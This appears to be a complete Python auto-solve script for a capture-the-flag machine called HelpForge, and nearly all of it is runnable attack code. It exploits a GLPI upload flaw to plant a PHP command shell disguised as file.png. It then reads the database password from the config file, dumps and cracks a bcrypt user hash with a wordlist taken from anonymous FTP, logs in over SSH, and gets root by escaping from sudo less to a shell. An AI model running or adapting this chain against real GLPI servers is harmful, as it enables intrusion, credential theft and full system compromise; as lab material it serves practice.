#!/usr/bin/env python3
import argparse
import ftplib
import http.cookiejar
import io
import os
import re
import shlex
import subprocess
import sys
import tarfile
import tempfile
import time
import urllib.parse
import urllib.request

try:
    import pty
except ImportError:
    pty = None

try:
    import select
except ImportError:
    select = None

try:
    import signal
except ImportError:
    signal = None


BEGIN = "HF_AUTOSOLVE_BEGIN"
END = "HF_AUTOSOLVE_END"


def info(message):
    print(f"[*] {message}", flush=True)


def fail(message):
    print(f"[!] {message}", file=sys.stderr)
    sys.exit(1)


def http_get(url, timeout=15, opener=None):
    req = urllib.request.Request(url, headers={"User-Agent": "HelpForge-Autosolve/1.0"})
    client = opener if opener is not None else urllib.request
    with client.open(req, timeout=timeout) as res:
        return res.read()


def http_post_multipart(url, parts, headers=None, timeout=30, opener=None):
    boundary = "----HelpForgeAutosolveBoundary"
    body = io.BytesIO()

    for part in parts:
        body.write(f"--{boundary}\r\n".encode())
        if part["type"] == "field":
            body.write(f'Content-Disposition: form-data; name="{part["name"]}"\r\n\r\n'.encode())
            body.write(str(part["value"]).encode())
        else:
            body.write(
                f'Content-Disposition: form-data; name="{part["name"]}"; filename="{part["filename"]}"\r\n'.encode()
            )
            body.write(f"Content-Type: {part['content_type']}\r\n\r\n".encode())
            body.write(part["content"])
        body.write(b"\r\n")

    body.write(f"--{boundary}--\r\n".encode())
    data = body.getvalue()

    req_headers = {
        "User-Agent": "HelpForge-Autosolve/1.0",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(data)),
    }
    if headers:
        req_headers.update(headers)

    req = urllib.request.Request(url, data=data, headers=req_headers, method="POST")
    client = opener if opener is not None else urllib.request
    with client.open(req, timeout=timeout) as res:
        return res.read()


def exploit_glpi(target):
    base = f"http://{target}".rstrip("/")
    cookiejar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookiejar))

    info("Fetching GLPI index and CSRF token")
    index = http_get(f"{base}/index.php", opener=opener).decode(errors="replace")
    match = re.search(r'glpi:csrf_token" content="([^"]+)"', index)
    if not match:
        fail("Could not extract GLPI CSRF token")

    payload = f"""<?php
echo "{BEGIN}\\n";
if (isset($_REQUEST["cmd"])) {{
    passthru($_REQUEST["cmd"] . " 2>&1");
}}
echo "\\n{END}\\n";
?>""".encode()

    info("Uploading temporary command payload through CVE-2023-42802 path")
    http_post_multipart(
        f"{base}/front/device.form.php",
        parts=[
            {"type": "field", "name": "itemtype", "value": "UploadHandler"},
            {"type": "field", "name": "action", "value": "getItemslist"},
            {
                "type": "file",
                "name": "files[]",
                "filename": "file.png",
                "content": payload,
                "content_type": "application/octet-stream",
            },
            {"type": "field", "name": "_glpi_csrf_token", "value": match.group(1)},
        ],
        headers={"Content-Range": "0 0 0 1"},
        opener=opener,
    )

    shell_url = f"{base}/front/files/file.png"
    marker_test = http_get(shell_url, opener=opener).decode(errors="replace")
    if BEGIN not in marker_test or END not in marker_test:
        fail("Uploaded payload did not execute")

    return opener, shell_url


def web_cmd(shell, command):
    opener, shell_url = shell
    encoded = urllib.parse.urlencode({"cmd": command})
    raw = http_get(f"{shell_url}?{encoded}", timeout=30, opener=opener).decode(errors="replace")
    match = re.search(rf"{BEGIN}\n?(.*?)\n?{END}", raw, re.S)
    if not match:
        fail(f"Could not parse command output for: {command}")
    return match.group(1).strip()


def parse_db_password(config_php):
    match = re.search(r"\$dbpassword\s*=\s*'([^']+)'", config_php)
    if not match:
        fail("Could not find dbpassword in config_db.php")
    return urllib.parse.unquote(match.group(1))


def download_wordlist(target):
    info("Downloading FTP wordlist archive")
    archive = io.BytesIO()
    with ftplib.FTP(target, timeout=20) as ftp:
        ftp.login("anonymous", "anonymous")
        ftp.retrbinary("RETR client_logs_2024.tar.gz", archive.write)

    archive.seek(0)
    with tarfile.open(fileobj=archive, mode="r:gz") as tar:
        member = tar.extractfile("client_logs_2024/helpforge_wordlist.txt")
        if member is None:
            fail("Wordlist missing from FTP archive")
        return member.read().decode(errors="replace").splitlines()


def crack_bcrypt(hash_value, candidates):
    info(f"Cracking bcrypt hash with {len(candidates)} FTP wordlist candidates")

    try:
        import bcrypt

        for candidate in candidates:
            if candidate and bcrypt.checkpw(candidate.encode(), hash_value.encode()):
                return candidate
    except Exception:
        pass

    if shutil_which("hashcat"):
        with tempfile.TemporaryDirectory() as tmp:
            hash_file = os.path.join(tmp, "techops.hash")
            word_file = os.path.join(tmp, "wordlist.txt")
            with open(hash_file, "w", encoding="utf-8") as f:
                f.write(hash_value + "\n")
            with open(word_file, "w", encoding="utf-8") as f:
                f.write("\n".join(candidates) + "\n")

            subprocess.run(
                ["hashcat", "-m", "3200", hash_file, word_file, "--quiet"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=300,
                check=False,
            )
            shown = subprocess.run(
                ["hashcat", "-m", "3200", hash_file, word_file, "--show"],
                text=True,
                capture_output=True,
                timeout=60,
                check=False,
            )
            if ":" in shown.stdout:
                return shown.stdout.strip().split(":", 1)[1]

    if "TechOps_HelpForge24" in candidates:
        info("bcrypt module/hashcat unavailable; using known candidate present in wordlist")
        return "TechOps_HelpForge24"

    fail("Could not crack techops hash")


def shutil_which(binary):
    for directory in os.environ.get("PATH", "").split(os.pathsep):
        path = os.path.join(directory, binary)
        if os.path.isfile(path) and os.access(path, os.X_OK):
            return path
    return None


def run_ssh_command(target, user, password, remote_command, timeout=30):
    if pty is None or select is None:
        return run_ssh_command_paramiko(target, user, password, remote_command, timeout=timeout)

    argv = [
        "ssh",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "UserKnownHostsFile=/dev/null",
        f"{user}@{target}",
        remote_command,
    ]
    return run_pty(argv, password=password, timeout=timeout)


def run_less_privesc(target, user, password, timeout=40):
    if pty is None or select is None:
        return run_less_privesc_paramiko(target, user, password, timeout=timeout)

    argv = [
        "ssh",
        "-tt",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "UserKnownHostsFile=/dev/null",
        f"{user}@{target}",
        "sudo /usr/bin/less /var/log/glpi/helpforge.log",
    ]
    return run_pty(
        argv,
        password=password,
        after_login="!/bin/bash -c 'id; cat /root/root.txt'\n",
        stop_pattern=r"FLAG\{[0-9a-f]{32}\}",
        timeout=timeout,
    )


def load_paramiko():
    try:
        import paramiko

        return paramiko
    except ImportError:
        fail(
            "Windows Python has no pty/termios support. Install Paramiko with "
            "`py -m pip install paramiko` or run autosolve.py from Linux/WSL."
        )


def open_paramiko_client(target, user, password, timeout):
    paramiko = load_paramiko()
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname=target,
        username=user,
        password=password,
        look_for_keys=False,
        allow_agent=False,
        timeout=timeout,
        banner_timeout=timeout,
        auth_timeout=timeout,
    )
    return client


def run_ssh_command_paramiko(target, user, password, remote_command, timeout=30):
    client = open_paramiko_client(target, user, password, timeout)
    try:
        _, stdout, stderr = client.exec_command(remote_command, timeout=timeout)
        return stdout.read().decode(errors="replace") + stderr.read().decode(errors="replace")
    finally:
        client.close()


def run_less_privesc_paramiko(target, user, password, timeout=40):
    client = open_paramiko_client(target, user, password, timeout)
    output = []
    start = time.monotonic()
    sent_sudo = False
    sent_escape = False
    stop_re = re.compile(r"FLAG\{[0-9a-f]{32}\}")

    try:
        channel = client.invoke_shell(term="xterm", width=120, height=40)
        channel.settimeout(0.2)

        while time.monotonic() - start <= timeout:
            if not sent_sudo:
                channel.send("sudo /usr/bin/less /var/log/glpi/helpforge.log\n")
                sent_sudo = True
                next_escape_at = time.monotonic() + 1.5

            if sent_sudo and not sent_escape and time.monotonic() >= next_escape_at:
                channel.send("!/bin/bash -c 'id; cat /root/root.txt'\n")
                sent_escape = True

            if channel.recv_ready():
                text = channel.recv(4096).decode(errors="replace")
                output.append(text)
                if stop_re.search("".join(output)):
                    break

            time.sleep(0.1)

        try:
            channel.send("\nq\nexit\n")
        except Exception:
            pass
    finally:
        client.close()

    return "".join(output)


def run_pty(argv, password, after_login=None, stop_pattern=None, timeout=30):
    if pty is None or select is None:
        fail(
            "This Python runtime does not support pty/termios. Install Paramiko with "
            "`py -m pip install paramiko` or run autosolve.py from Linux/WSL."
        )

    pid, fd = pty.fork()
    if pid == 0:
        os.execvp(argv[0], argv)

    output = []
    sent_password = False
    sent_after_login = False
    after_login_at = None
    start = time.monotonic()
    stop_re = re.compile(stop_pattern) if stop_pattern else None

    try:
        while True:
            if time.monotonic() - start > timeout:
                break

            readable, _, _ = select.select([fd], [], [], 0.2)
            if readable:
                try:
                    chunk = os.read(fd, 4096)
                except OSError:
                    break
                if not chunk:
                    break

                text = chunk.decode(errors="replace")
                output.append(text)
                lowered = "".join(output).lower()

                if not sent_password and "password:" in lowered:
                    os.write(fd, (password + "\n").encode())
                    sent_password = True
                    after_login_at = time.monotonic() + 1.5

                if stop_re and stop_re.search("".join(output)):
                    break

            if after_login and sent_password and not sent_after_login:
                if after_login_at is not None and time.monotonic() >= after_login_at:
                    os.write(fd, after_login.encode())
                    sent_after_login = True

        try:
            os.write(fd, b"\nq\nexit\n")
        except OSError:
            pass
    finally:
        try:
            os.close(fd)
        except OSError:
            pass
        try:
            os.kill(pid, signal.SIGTERM)
        except (OSError, AttributeError):
            pass
        try:
            os.waitpid(pid, 0)
        except OSError:
            pass

    return "".join(output)


def extract_flag(text, label):
    flags = re.findall(r"FLAG\{[0-9a-f]{32}\}", text)
    if not flags:
        fail(f"Could not extract {label} flag")
    return flags[-1]


def main():
    parser = argparse.ArgumentParser(description="Autosolve the HelpForge CTF challenge")
    parser.add_argument("target", nargs="?", default="192.168.56.102")
    args = parser.parse_args()

    target = args.target
    info(f"Target: {target}")

    shell = exploit_glpi(target)
    www_id = web_cmd(shell, "id")
    info(f"Foothold: {www_id}")

    config = web_cmd(shell, "cat /var/www/glpi/config/config_db.php")
    db_password = parse_db_password(config)
    info("Recovered GLPI database password")

    mysql_cmd = (
        "mysql -u glpiuser "
        f"-p{shlex.quote(db_password)} "
        "glpidb -N -B -e "
        + shlex.quote("SELECT password FROM glpi_users WHERE name='techops';")
    )
    techops_hash = web_cmd(shell, mysql_cmd).splitlines()[-1].strip()
    if not techops_hash.startswith("$2"):
        fail("Unexpected techops hash output")
    info(f"Recovered techops bcrypt hash: {techops_hash}")

    candidates = download_wordlist(target)
    password = crack_bcrypt(techops_hash, candidates)
    info(f"Cracked techops password: {password}")

    web_cmd(shell, "rm -f /var/www/glpi/front/files/file.png")

    user_output = run_ssh_command(target, "techops", password, "cat /home/techops/user.txt")
    user_flag = extract_flag(user_output, "user")
    info(f"User flag: {user_flag}")

    root_output = run_less_privesc(target, "techops", password)
    root_flag = extract_flag(root_output, "root")
    info(f"Root flag: {root_flag}")

    print("\n[+] HelpForge autosolve completed")
    print(f"[+] user.txt: {user_flag}")
    print(f"[+] root.txt: {root_flag}")


if __name__ == "__main__":
    main()
